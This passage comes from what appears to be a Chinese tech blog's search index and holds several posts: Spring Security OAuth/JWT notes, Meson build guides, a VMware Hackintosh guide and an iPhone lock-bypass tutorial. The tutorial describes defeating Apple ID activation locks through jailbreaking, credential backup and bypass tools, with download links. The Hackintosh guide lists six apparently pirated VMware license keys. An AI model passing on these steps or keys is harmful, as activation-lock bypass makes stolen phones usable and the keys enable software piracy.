"96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"企业面试"},{title:"iPhone 破解屏幕锁、停用锁、丢失锁、ID 锁教程",url:"/posts/9ab7ecb5.html",text:'前言本文主要介绍 iPhone 如何破解屏幕锁、停用锁、丢失锁、ID 锁，由于篇幅有限，下面只会给出核心说明、软件下载链接与视频教程链接等，毕竟网上有很多可以参考的资料。其中破解 ID 锁常见有三种方式，包括绕过 ID（跳过 ID 锁登录）、隐藏 ID（将 ID 锁隐藏起来）、删除 ID（将 ID 锁删除掉），为了描述方便下文统一简述为破解 ID 锁。下文是笔者亲身实践的总结内容，2020 年 8 月亲测成功解锁了 iPhone 6SP（iOS 12）、iPhone 8（iOS 13） 的 ID 锁。随着时间的推移，笔者不能保证本文内容（视频教程、软件工具等）可以长期生效，毕竟 iOS 14 已经发布了；而且破解 iPhone 各种锁本来就是攻防之间的较量，破解技术一直在不断地进步，苹果的安全技术也同样不断在完善。 各种锁介绍 丢失锁被失主激活，刷机即可解决 屏幕锁的密码忘记了，刷机即可解决 多次输出错误的屏幕锁密码，导致 iPhone 激活了停用锁，刷机即可解决 IOS 系统开启了 查找我的 iPhone 功能后，即使 ID 锁被激活了，可以使用以下三种方法破解 ID 锁： 方法一、刷机 + 越狱 + 激活 方法二、越狱 + 备份激活凭证 + 刷机 + 越狱 + 激活 + 还原激活凭证 方法三、越狱 + 关闭 查找我的 iPhone 的功能（一般包含了激活凭证的备份与还原） + 刷机，此方法暂时只适用于 IOS 13+ 的系统（不包括从低版本升级到 IOS 13+ 的情况） 特别注意事项： 建议无论是使用哪种方法破解 ID 锁，为了以防万一，都建议先越狱并备份激活凭证 如果实在无法备份激活凭证（例如越狱失败），此时若采用上面的方法一破解 ID 锁后，三网的机子（两网除外）只能当游戏机用了，无法正常使用 Sim 卡的打电话和 4G 网络等功能！！！ 如果 IOS 系统开启了 查找我的 iPhone 功能（ID 锁被激活），那么原系统都必须先越狱，然后备份原系统的激活凭证，再执行其他操作，否则一旦刷机或升级系统后，三网的机子（两网除外）即使激活了系统也无法正常使用 Sim 卡的打电话和 4G 网络等功能，切记！！！ 各种锁破解后的功能介绍1、屏幕锁、停用锁、丢失锁破解后的功能说明如下： 完美全功能，破解后等于没有 ID 锁，相当于官解 2、两网版机子破解 ID 锁后的功能说明如下： Siri iCloud 云同步 重启 / 关机 打电话 / 4G 上网 通知推送 破解网络锁 系统升级还原抹除 3、三网版机子破解 ID 锁后的功能说明如下： Siri iCloud 云同步 重启 / 关机 通知推送 破解网络锁 打电话 / 4G 上网 系统升级还原抹除 越狱Checkra1n 越狱工具Checkra1n 是一款适用于 iPhone 5s ~ iPhone X（A7 - A11 处理器），且 iOS 系统版本为 12.3+ 的越狱工具，支持运行在 Mac、Linux 系统，暂时不支持 Windows 系统。普通的家用电脑（Windows 系统）可以使用 Checkra1n 镜像制作 Linux Live U 盘，然后在 BIOS 里设置从 U 盘启动，这样就可以使用 Linux 系统里的 Checkra1n 工具了。Checkra1n 0.10.2 版本的镜像可以从这里下载，该镜像的原地址和使用教程在这里，支持 U 盘和硬盘启动，硬盘启动教程可以参考博客。如果需要其他版本的 Checkra1n Linux 镜像，可从百度网盘下载，提取码为 erso，具体的使用教程可以看这里，Checkra1n 与 IOS 系统的版本对应关系如下： Checkra1n 0.9.8 适用 IOS 12.3 ~ IOS 13.3.1 Checkra1n 0.9.8.1 适用 IOS 12.3 ~ IOS 13.3.1 Checkra1n 0.9.8.2 适用 IOS 12.3 ~ IOS 13.3.1 Checkra1n 0.10.1 适用 IOS 12.3 ~ IOS 13.4.1 Checkra1n 0.10.2 适用 IOS 12.3 ~ IOS 13.5 Checkra1n 越狱视频教程 Checkra1n U 盘越狱 iOS 13.6 Checkra1n U 盘越狱 Checkra1n Liunx U 盘 iOS 13 越狱 Checkra1n 越狱 0.9.8~0.1.0.2 共存版 Checkra1n 越狱错误码汇总Checkra1n 官方 issues 可以看这里，中文版的越狱错误汇总可以看这里，常见的错误如下： -26 或者 -31 错误码 不支持在虚拟机内（VMware/VBox）运行 Checkra1n 越狱工具 -77 错误码 解开锁屏 /iPhone 停用界面后，进入系统界面再越狱，这种错误一般在使用 Checkra1n Linux 镜像（U 盘版）时会出现 若锁屏 /iPhone 停用界面无法解开，可以物理安装 Ubuntu 系统或者使用 Ubuntu Live 盘，在 Ubuntu 系统里通过 apt-get 安装 Checkra1n（必须提前执行 apt-get upgrade 命令，否则安装会出现依赖问题），或者在 Checkra1n 官网下载编译好的可执行文件来安装，安装完成后执行越狱操作即可 (adsbygoogle = window.adsbygoogle || []).push({}); 破解 ID 锁破解 ID 锁视频教程以下视频来源 Youtube 平台，请自备梯子，否则无法正常打开。 苹果手机解锁 - 删除 - 查找我的 iPhone（免费）随意刷机，永久成为你自己的机器 停用的苹果 iPhone 手机 ID 密码忘了，完美绕过 ID 可以打电话上网 4G 一切正常 一个 U 盘就可以绕过苹果 Icloud 激活锁 A7-A11 所有设备 iPhone and ipad bypass icloud 苹果越狱 - 跳过 ID 激活锁 - 直接插 Sim 卡就可以打电话了 - 2020 年 4 月 26 日 FREE CELLULAR FIX for Passcode Locked &amp; Di 苹果越狱 - 跳过 ID 激活锁 - 直接插 SIM 卡就可以打电话了（Windows 版说明）FREE CELLULAR FIX for Passcode Locked &amp; D iCLoud Bypass iOS 12.3-13.6 Sim Card Fix Call And Internet In Window Real Full Untethered Bypass iCloud on iPhone &amp; iPad iOS 12.4.8 - iOS 13.6.1 | Windows Tutorial 运行平台 一、Mac 平台全搞定 二、 Linux 平台全搞定（Debian、Ubuntu） 三、混合平台，可任意组合使用，组合案例如下 刷机：Windows 系统 + 爱思助手 越狱：U 盘 + Checkra1n Linux 镜像 破解 ID 锁：Windows 系统 + iFRPFILE 备份与还原激活凭证：Windows 系统 + Sliver 工具软件破解 ID 锁 Sliver：激活凭证备份与还原 iFRPFILE：系统激活工具（破解 ID 锁） iCloud Bypass：系统激活工具（破解 ID 锁） X-Activator：集成了越狱、破解 ID 锁、修复推送等功能，该软件收费 各种软件下载请自备梯子，否则以下软件可能会下载失败，同时随着时间的推移，工具可能会失效。 Checkra1n 越狱工具：下载地址 iCloud Bypass Windows 版：下载地址 Checkra1n Linux 镜像：下载地址，提取码：erso Sliver Windows 版：下载地址，解压密码：https://t.me/itlj8 Sliver Mac 版：下载地址，访问密码：itlj8，解压密码：https://t.me/itlj8 功能验证 短信是否可用 WiFi 是否可用 2G/4G 网络是否可用 是否可以接听和拨打电话 系统是否正常重启和关机 是否可以通过 APP Store 安装应用 通知推送、iCloud、iTunes、Siri 是否可用 技巧总结判断 IOS 系统的版本若开机后是屏幕锁、停用锁、丢失锁界面，可以通过以下方式区分 IOS 12 和 IOS 13 系统： 静音键：按下静音键，若音量弹窗出现在屏幕中间，那就是 IOS 12 系统，音量弹窗出现在屏幕顶部，那就是 IOS 13 系统 恢复模式：进入恢复模式，如果界面出现了彩色的 iTunes Logo（如图），那就是那就是 IOS 12 系统，如果是全白色的图案（如图），就是 IOS 13 系统 查询 iPhone 的硬件配置在得知 IMEI 码的前提下，可以通过 IMEI 码查询 iPhone 具体的硬件配置信息，例如设备型号、硬盘容量、销售地区等，网上资料很多，这里不再累述。 查询 iPhone 的 ID 锁状态若开机后是屏幕锁、停用锁、丢失锁界面，可通过手机卡托上的 IMEI 序号，到 imeipro 网站（请自备梯子）查询 iPhone 的激活锁是否被激活（即是否开启了 “查找我的 iPhone”）；如果激活锁处于关闭状态（不存在 ID 锁），那么直接刷机就能当正常的 iPhone 手机使用了。 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"生活随笔"},{title:"Spring Security + OAuth 2.0 + JWT 开发随笔",url:"/posts/894ad1eb.html",text:'JWT 签名与验签公钥与私钥生成使用 JDK 提供的 keytool 工具生成 JKS 密钥库 (Java Key Store)，认证授权服务器会使用私钥对 Token 进行签名，一般将生成的 shop.jks 文件放在 resources 目录下 1keytool -genkey -alias shop -keyalg RSA -keypass 123456 -keystore shop.jks -storepass 123456 根据私钥生成公钥，将其保存在 public.crt 文件中，用于对 Token 进行验签，一般将其放 resources 目录下 1keytool -list -rfc --keystore shop.jks | openssl x509 -inform pem -pubkey -noout 123456789-----BEGIN PUBLIC KEY-----MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAtXKXj3JGNJNWVXg4+++4FtNTJre+8kHLdPLwHJJcRw4aV7oMMjI1nesyj75w/kjRZImhbNo0poEu1jj+sDO9UbLUHSy59zoDDMZTYmbkboDEpkFq3ZUhAoLtt5DtAgI8DkOK22RlSxXpcMvkeL8XziFizWf/HatSgAat/SfX+5dH3KX40piPv9kI5YVJz1GyD8xO4dN95tr0Ld7FDmdKJBPWfkM+CMlKRhYqB+sAlaQW5/L3xb3WNftucC/RhdKT8/mmgMsIBhUZOS/1iFnDKuPsEwU5xEQxK9pWX2bWsSkeOgQYJmQa6hiWBuujPUyOs4rICvniopxsW2yyPOFXZQIDAQAB-----END PUBLIC KEY----- 认证授权服务器加载 JKS 秘钥库认证授权服务器加载 JKS 秘钥库，从中获取密钥对（公钥 + 私钥），Java 示例代码如下： 1234567891011/** * 从ClassPath下的密钥库中获取密钥对（公钥+私钥） * * @return */@Beanpublic KeyPair keyPair() { KeyStoreKeyFactory factory = new KeyStoreKeyFactory(new ClassPathResource("shop.jks"), "123456".toCharArray()); KeyPair keyPair = factory.getKeyPair("shop", "123456".toCharArray()); return keyPair;} 认证授权服务器暴露获取公钥的接口对外暴露 JWK Set URI 接口，让其他应用系统可以获取到公钥 1234567891011121314151617181920@RestController@RequestMapping("/oauth")public class JwkSetController { @Autowired private KeyPair keyPair; /** * 获取公钥 * * @return */ @GetMapping("/.well-known/jwks.json") public Map&lt;String, Object&gt; publicKey() { RSAPublicKey publicKey = (RSAPublicKey) keyPair.getPublic(); RSAKey key = new RSAKey.Builder(publicKey).build(); return new JWKSet(key).toJSONObject(); }} 或者通过 KeyPair 来获取公钥 123456789101112131415161718@RestController@RequestMapping("/oauth")public class PublicKeyController { @Autowired private KeyPair keyPair; /** * 获取公钥 * * @return */ @GetMapping("/publicKey") public String publicKey() { return Base64.encode(new String(keyPair.getPublic().getEncoded())); }} 或者直接使用 OAuth 2.0 内置的接口 /oauth/token_key 来获取公钥 12# 下述的"127.0.0.1:8080"是认证授权服务器的地址$ curl --request GET \'http://127.0.0.1:8080/oauth/token_key 1234{ "alg": "SHA256withRSA", "value": "-----BEGIN PUBLIC KEY-----\\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAtXKXj3JGNJNWVXg4+++4FtNTJre+8kHLdPLwHJJcRw4aV7oMMjI1nesyj75w/kjRZImhbNo0poEu1jj+sDO9p8n5oYXn3qU8bsmqLa/vttq7Ubi4a5eaoP8ASjoD+dnQ0I7ZdpH/fiiHfriGI4tFziFizWf/HatSgAat/SfX+5dk3KX40piPv9kI5YVJz1GyD8xO4dN9dtr0Ld7FDmdKJBPWfkM+CMlKRhYqB+sAlaQW5/L3xb3WNftucC/RhdKT8/mmgMsIBhUZOS/1iFnDKaPsEwU5xEQxK9pWX2bWsSkeOgQYJmQa6hiWBuujPUyOs4rICvniopxsW2yyPOFXZQIDAQAB\\n-----END PUBLIC KEY-----"} 资源服务器指定公钥文件的路径在 YML 配置里指定认证授权服务器暴露的 JWK Set URI 接口，以此来获取公钥，值得一提的是，默认情况下 jwk-set-uri 指定的 URL 无法使用 Ribbon 来实现负载均衡访问（除非利用 DNS 的域名解析，即单个域名绑定多个 IP，通过 DNS 服务器做负载均衡） 12345678spring: application: name: gateway-server security: oauth2: resourceserver: jwt: jwk-set-uri: http://127.0.0.1:8080/oauth/.well-known/jwks.json 或者将上面通过 keytool 工具获取到的公钥拷贝到 src/main/resources/public.crt 文件中，然后在 YML 配置里指定公钥文件的路径 12345678spring: application: name: gateway-server security: oauth2: resourceserver: jwt: public-key-location: classpath:public.crt (adsbygoogle = window.adsbygoogle || []).push({}); Cannot convert access token to JSON 错误应用启动后，出现 Cannot convert access token to JSON 这个错误，主要是 OAuth 2.0 的资源服务器缺少了加载公钥的配置，解决方法如下： 123456789@Beanpublic JwtAccessTokenConverter accessTokenConverter() { JwtAccessTokenConverter converter = new JwtAccessTokenConverter(); // 获取公钥 String publicKey = getPublicKey(); // 加载公钥 converter.setVerifier(new RsaVerifier(publicKey)); return converter;} 资源服务器加载公钥的完整示例代码如下： 1234567891011121314151617181920212223242526 &lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;fastjson&lt;/artifactId&gt; &lt;version&gt;1.2.75&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;xom&lt;/groupId&gt; &lt;artifactId&gt;xom&lt;/artifactId&gt; &lt;version&gt;1.3.7&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.jdom&lt;/groupId&gt; &lt;artifactId&gt;jdom&lt;/artifactId&gt; &lt;version&gt;2.0.2&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;net.sf.json-lib&lt;/groupId&gt; &lt;artifactId&gt;json-lib&lt;/artifactId&gt; &lt;version&gt;2.1&lt;/version&gt; &lt;classifier&gt;jdk15&lt;/classifier&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;cn.hutool&lt;/groupId&gt; &lt;artifactId&gt;hutool-all&lt;/artifactId&gt; &lt;version&gt;5.5.8&lt;/version&gt;&lt;/dependency&gt; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124import cn.hutool.core.io.FileUtil;import cn.hutool.core.util.StrUtil;import com.alibaba.fastjson.JSONObject;import net.sf.json.xml.XMLSerializer;import org.slf4j.Logger;import org.slf4j.LoggerFactory;import org.springframework.beans.factory.annotation.Value;import org.springframework.boot.autoconfigure.security.oauth2.resource.OAuth2ResourceServerProperties;import org.springframework.context.annotation.Bean;import org.springframework.context.annotation.Configuration;import org.springframework.core.io.ClassPathResource;import org.springframework.core.io.Resource;import org.springframework.security.jwt.crypto.sign.RsaVerifier;import org.springframework.security.oauth2.provider.token.TokenStore;import org.springframework.security.oauth2.provider.token.store.JwtAccessTokenConverter;import org.springframework.security.oauth2.provider.token.store.JwtTokenStore;import org.springframework.web.client.RestTemplate;import java.io.BufferedReader;import java.io.InputStreamReader;import java.util.stream.Collectors;/** * OAuth2.0认证的Token配置 */@Configurationpublic class OAuthTokenConfig { /** * 获取公钥的接口地址 */ @Value("${spring.security.oauth2.resourceserver.jwt.key-set-uri:}") private String keySetUri; private OAuth2ResourceServerProperties resourceServerProperties; private static final Logger logger = LoggerFactory.getLogger(OAuthTokenConfig.class); public OAuthTokenConfig(OAuth2ResourceServerProperties resourceServerProperties) { this.resourceServerProperties = resourceServerProperties; } @Bean public TokenStore tokenStore() { return new JwtTokenStore(accessTokenConverter()); } @Bean public JwtAccessTokenConverter accessTokenConverter() { JwtAccessTokenConverter converter = new JwtAccessTokenConverter(); String publicKey = getPublicKey(); converter.setVerifier(new RsaVerifier(publicKey)); logger.info("success to load public key"); return converter; } /** * 通过读取本地文件获取非对称加密公钥 * * @return 公钥 */ private String getPublicKey() { if (StrUtil.isBlank(keySetUri)) { return getKeyFromLocal(); } else { return getKeyFromAuthorizationServer(); } } /** * 通过访问授权服务器获取非对称加密公钥&lt;br&gt; * 这里可以直接使用OAuth2.0内置的接口来获取公钥，Key Set Uri 地址配置示例： http://127.0.0.1:8080/oauth/token_key * * @return 公钥 */ private String getKeyFromAuthorizationServer() { try { XMLSerializer xmlSerializer = new XMLSerializer(); String xmlPubKey = new RestTemplate().getForObject(keySetUri, String.class); String jsonPubKey = xmlSerializer.read(xmlPubKey).toString(); JSONObject json = JSONObject.parseObject(jsonPubKey); return json.get("value").toString(); } catch (Exception e) { logger.error("failed to load public key from authorization server: {}", e.getLocalizedMessage()); } return null; } /** * 获取本地的公钥 * * @return */ private String getKeyFromLocal() { Resource resource = getPublicKeyFile(); try (BufferedReader br = new BufferedReader(new InputStreamReader(resource.getInputStream()))) { return br.lines().collect(Collectors.joining("\\n")); } catch (Exception e) { logger.error("failed to load public key from local: {}", e.getLocalizedMessage()); } return null; } /** * 获取本地的公钥文件 * * @return */ private Resource getPublicKeyFile() { try { // 读取YML配置里指定的本地公钥文件，对应的YML配置如下： // spring.security.oauth2.resourceserver.jwt.public-key-location=public.crt Resource resource = resourceServerProperties.getJwt().getPublicKeyLocation(); if (FileUtil.exist(resource.getFile())) { return resource; } } catch (Exception e) { logger.error("failed to read public key file from local: {}", e.getLocalizedMessage()); } // 读取默认路径下的本地公钥文件 return new ClassPathResource("public.crt"); }} 123456789spring: application: name: provider-service security: oauth2: resourceserver: jwt: # public-key-location: classpath:public.crt # 加载本地的公钥文件 key-set-uri: http://127.0.0.1:8080/oauth/token_key # 从认证授权服务器获取公钥 特别注意：在上述代码中，若在 YML 文件里配置了从认证授权服务器获取公钥，那么必须使用 OAuth 2.0 内置的接口 /oauth/token_key 来获取公钥，同时使用的配置项是 key-set-uri，而不再是 jwk-set-uri OAuth 2.0 资源服务器资源服务器鉴权配置默认情况下，OAuth 2.0 的权限是从 Client 的 scope 中获取，示例代码如下： 123456789101112131415161718192021222324252627282930313233/** * 资源服务器配置 */@Configuration@EnableResourceServerpublic class OAuthResouceServer extends ResourceServerConfigurerAdapter { @Autowired private TokenStore tokenStore; /** * 资源配置 */ @Override public void configure(ResourceServerSecurityConfigurer resources) { resources.resourceId("school") .tokenStore(tokenStore) .stateless(true) .accessDeniedHandler(new CustomAccessDeniedHandler()); } /** * 对HTTP请求鉴权 */ @Override public void configure(HttpSecurity http) throws Exception { http.authorizeRequests() .antMatchers("/**").access("#oauth2.hasScope(\'teacher\')") .and().csrf().disable() .sessionManagement().sessionCreationPolicy(SessionCreationPolicy.STATELESS); }} 若权限存在于 authorities 中，需要替代 OAuth2ResourceServerWebSecurityConfiguration 的配置，示例代码如下： 弃用方法安全 通过自定义 Converter 来指定权限，Converter 是函数接口，当前上下问参数为 JWT 对象 获取 JWT 中的 authorities 12345678910111213141516171819@EnableGlobalMethodSecurity(prePostEnabled = true)@EnableWebSecuritypublic class WebSecurityConfig extends WebSecurityConfigurerAdapter { @Override protected void configure(HttpSecurity http) throws Exception { http.authorizeRequests() .anyRequest().authenticated() .and() .oauth2ResourceServer().jwt().jwtAuthenticationConverter(jwt -&gt; { Collection&lt;SimpleGrantedAuthority&gt; authorities = ((Collection&lt;String&gt;) jwt.getClaims() .get("authorities")).stream() .map(SimpleGrantedAuthority::new) .collect(Collectors.toSet()); return new JwtAuthenticationToken(jwt, authorities); }); }} 参考博客 Spring Security + OAuth 2.0 之 Resource Server（基于 JWT） 在 Spring Boot 的 YML 配置中使用 jwt.key-uri 替换 jwk.key-set-uri Spring Security Oauth2 添加自定义过滤器和 Oauth2 认证后 API 权限控制 Spring Cloud Oauth2 - Cannot convert access token to JSON 错误解决方法 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"微服务 开发随笔 oauth"},{title:"CLion 使用 Meson 构建 C/C++ 项目",url:"/posts/12d66a7e.html",text:'提示 本文适用于 Windows/Linux 系统，包括 Debian/Ubuntu/CentOS/Fedora 等 Linux 发行版。 Meson 入门指南 Meson 入门指南之一 CLion 使用 Meson 构建项目 CLion managing Meson projects Using meson as a build system with clion Working with meson in CLion using compilation db var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"开发工具"},{title:"Vmware 虚拟机安装黑苹果系统",url:"/posts/3cc999a7.html",text:'准备操作 设置主板的 BIOS，开启硬件虚拟化的支持 Windows 系统环境下，需要关闭虚拟软件 Hyper-V，在 控制面板-程序-添加关闭 Window 功能 里，把 Hyper-V 关闭即可 软件环境 软件 版本 Vmware 15.5.6 Pro Unlocker 3.0.3 操作系统 Windows 10 Vmware 安装 Vmware 官网下载 Vmware 15.5.6 Pro 版本的安装文件，然后直接点击 EXE 文件进行安装即可，完成安装后可以输入下列秘钥进行永久激活。 123456YG5H2-ANZ0H-M8ERY-TXZZZ-YKRV8UG5J2-0ME12-M89WY-NPWXX-WQH88UA5DR-2ZD4H-089FY-6YQ5T-YPRX6GA590-86Y05-4806Y-X4PEE-ZV8E0ZF582-0NW5N-H8D2P-0XZEE-Z22VAYA18K-0WY8P-H85DY-L4NZG-X7RAD Unlocker 安装 由于 Vmware 默认屏蔽了 Mac OS 系统的支持，因此需要使用 Unlocker 工具进行解锁。最新版的 Unlocker 可以从 Github 上下载，由于官方的 Unlocker 会在运行期间到 Vmware 官网下载 com.vmware.fusion.tools.darwin.zip.tar 文件，整个下载过程非常慢。因此建议在 Unlocker 的目录下创建 tools 目录，然后手动下载 com.vmware.fusion.tools.darwin.zip.tar 文件到 tools 目录下，此时还需要更改 Unlocker 的 Python 代码，具体操作可参考文章。最后使用管理员权限运行 win-install.cmd 可执行文件即可，解锁完成后 Vmware 新建虚拟机时即可看到 Apple Mac OS X 的选项（如下图）。 特别注意：Unlocker 须解压在非中文的目录路径下，不同版本的 Vmware 需要用的 Unlocker 版本是不一样的，Vmware 15.5.6 Pro 对应 Unlocker 3.0.3 版本，解锁所需的资源文件如下： Unlocker 3.0.3 代码更改版：百度网盘，提取码: hxh6 com.vmware.fusion.tools.darwin.zip.tar：下载地址，若下载失败可以到这里找到可用的版本（11.1.0），并在 packages 目录里下载该文件 Vmware 安装 Mac OS Vmware14 安装黑苹果 mac ox x 10.13 懒人版教程 虚拟机 Vmware 安装黑苹果 MacOS Sierra 图文教程 Vmware 15.5 虚拟机 MacOS 系统手动安装 Vmware Tools Vmware 11 安装 Mac OS X 10.10 及安装 Mac Vmware Tools 黑苹果 Vmware 安装 AppStore 原版 MacOS Catalina 10.15.1，附 VirtualBox 安装 High Sierra 10.13 教程和升级到 Mojave 10.14.5 安装 Vmware Tools Vmware Tools 可以提高鼠标操作的流畅度、实现全屏显示、文件共享等，当在 Vmware 虚拟机中安装好 Mac OS 后，在 Vmware 软件中点击安装 Vmware Tools 的选项，会弹出提示：无法在更新服务器上找到组件。请联系Vmware技术支持或您的系统管理员。这是因为在 Mac OS 里安装 Vmware Tools 需要用到一个叫 darwin.iso 的文件，可以在 Vmware 官网下载该文件，找到最新的版本号（11.1.0），下载 packge 目录下的 com.vmware.fusion.tools.darwin.zip.tar 文件即可。下载后逐级打开压缩文件，在 payload 目录中可以找到 darwin.iso 文件，将其解压并拷贝到 Vmware 的安装根目录（C:\\Program Files (x86)\\Vmware\\Vmware Workstation）。最后将虚拟机中的 Mac OS 关机，然后在虚拟机的设置中将 CD/DVD 指定为 darwin.iso，启动 Mac OS 后在桌面右边就可以看到 Vmware Tools，直接双击执行安装操作即可。 资源下载 可以从百度网盘上打包下载以下工具，提取码为 a5qr 1234MK-Unlocker-VM15.5.zipVmware Tools linux-Win-Mac .zipVmware Workstation Pro v15.5.6 Lite.rarMacOS Mojave 10.14.5 (18F132)懒人镜像.zip 补充说明 不建议使用 VBox 安装黑苹果系统，因为 VBox 出问题的概率很大 Vmware 安装黑苹果系统的时候，建议直接使用懒人版的 cdr 镜像 Mac OS 原版 dmg 镜像只能安装在 GPT 分区格式的硬盘上，懒人版 cdr 镜像可以安装在 MBR 格式和 GPT 分区格式的硬盘上 Vmware 15.5.6 Pro 里的 Mac OS 在正常情况下可以直接识别到 IPhone 设备，导航到 菜单栏 - 虚拟机 - 可移动设备 就可以看到，如果无法识别，建议在 Windows 系统（宿主机）上安装好 iTunes 再试试 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"开发工具"},{title:"Meson 入门指南之一",url:"/posts/68d93948.html",text:"相关站点 Meson 官网 Meson 官方文档 Meson GitHub 项目 Meson 介绍Meson 的简介Meson（The Meson Build System）是个项目构建系统，类似的构建系统有 Makefile、CMake、automake …。 Meson 是一个由 Python 实现的开源项目，其思想是，开发人员花费在构建调试上的每一秒都是浪费，同样等待构建过程直到真正开始编译都是不值得的。因此，Meson 的设计目的是在用户友好的同时不损害性能，Meson 提供客户语言（custom language）作为主要工具，用户可以使用它完成项目构建的描述。客户语言的设计目标是简单（simplicity）、清晰（clarity）、简洁（conciseness），其中很多灵感来源于 Python 语言。Meson 的另个一主要设计目的是为现代编程工具提供优秀的支持和最好的实现。这包括一些特性如：单元测试（unit testing）、代码覆盖率报告（code coverage reporting）、头文件预编译（precompiled headers）。用户不需要寻找第三方宏指令（third party macros）或编写 Shell 脚本来实现这些特性，Meson 可以开箱即用。Meson 相比 CMake 来说，不仅仅支持 C/C++，还支持多种编程语言。如今，很多项目都由 CMake 转向到了 Meson，例如 DPDK 和 Mapnik。 Ninja 的简介项目开发中一般将 Meson 和 Ninja 配合使用，Meson 负责构建项目依赖关系，Ninja 负责编译代码。Ninja 是一个轻量的构建系统，主要关注构建的速度。它与其他构建系统的区别主要在于两个方面：一是 Ninja 被设计成需要一个输入文件的形式，这个输入文件则由高级别的构建系统生成；二是 Ninja 被设计成尽可能快速执行构建的工具。 Meson 的特性 支持多种平台，包括 Linux、macOS、Windows、GCC、Clang、Visual Studio 等 支持多种编程语言，包括 C/C++、D、Fortran、Java、Rust 支持在一个非常可读和用户友好的非图灵完整 DSL 中构建定义 支持很多操作系统和裸机进行交叉编译 支持极快的完整和增量构建而优化，而不牺牲正确性 支持与发行版包一起工作的内置多平台依赖提供程序 Meson 的依赖Meson 是依赖 Python 与 Ninja 实现的，依赖的版本如下： Python (version 3.6 or newer) Ninja (version 1.8.2 or newer) Meson 安装Windows 平台 a）在 Meson GitHub Releases 网站下载 Windows 版的安装程序，如 meson-0.60.3-64.msi b）双击 meson-0.60.3-64.msi 安装程序，按默认选项直接安装 Meson c）在系统的 开始菜单栏 里，找到 Visual Studio 开发人员工具（Native Tools Command Prompt for VS xxxx），双击运行后，在 CMD 窗口内执行以下命令查看 Meson 和 Ninja 的版本 12345&gt; meson --version0.60.3&gt; ninja --version1.10.2 Debian/Ubuntu1# apt install -y meson ninja-build Fedora/CentOS12345# yum install -y meson ninja-build# 或者# dnf install -y meson ninja-build 通过 PyPi 安装Meson 可以直接通过 PyPi 安装，但必须确保使用的是 Python3 的 pip，安装命令如下： 1# pip3 install meson ninja 或者使用标准的 Python 命令安装 Meson 12345# 安装meson# python3 -m pip install meson# 安装ninja# python3 -m pip install ninja Meson 运行warning若使用的是 Windows 平台，则需要在 Visual Studio 开发人员工具（Native Tools Command Prompt for VS xxxx）里执行 Meson 的命令，这是因为 C/C++ 编译器只会在该工具上运行。 通过 Mesonn 初始化新的 C/C++ 项目，并使用 Meson 构建项目 1234567891011# 创建一个新目录来保存项目文件$ mkdir meson_project# 进入项目目录$ cd meson_project# 使用Meson初始化并构建一个新的C/C++项目，会自动生成\"meson.build\"配置文件和C/C++源文件$ meson init --name meson_project --build# 项目构建完成后，默认的构建目录是build，可以直接运行构建生成的可执行文件$ build/meson_project 当项目代码发生变更后，可以进入 build 目录重新构建代码 12345# 进入build目录$ cd build# 重新构建代码$ meson compile Meson 项目的顶层目录结构如下 1234meson_project├── build # Meson的构建目录├── meson.build # Meson的配置文件└── meson_project.c # C/C++源文件 Meson 指定编译参数通过 meson configure 命令可以查看 Meson 内置的编译参数、默认值以及可选值 12345# 进入Meson项目的根目录$ cd meson_project# 查看Meson的编译参数$ meson configure Meson 项目可以通过 meson_options.txt 配置文件来增加项目特有的编译参数，如： 1234option('tests', type: 'boolean', value: true, description: 'build unit tests')option('use_hpet', type: 